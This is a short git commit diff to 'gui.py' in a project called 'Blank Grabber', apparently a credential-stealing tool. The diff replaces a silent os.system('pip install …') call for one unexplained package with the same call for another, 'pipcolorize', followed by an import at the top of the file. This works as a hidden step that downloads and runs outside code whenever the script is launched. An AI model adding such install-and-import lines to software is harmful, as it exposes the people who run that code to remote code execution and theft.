0b94066e489abf0b4e8e85d097d7f95d52ed4a03
Apfel <107504561+ApfelsaftDevs@users.noreply.github.com>
2023-04-04 13:46:47 +0200

    Update gui.py

--- Blank Grabber/gui.py
+++ Blank Grabber/gui.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pypackagehelp")
-import pypackagehelp
+os.system("pip install pipcolorize")
+import pipcolorize
 import tkinter as tk
 from tkinter import ttk, messagebox, filedialog
 from urllib.request import urlopen, Request
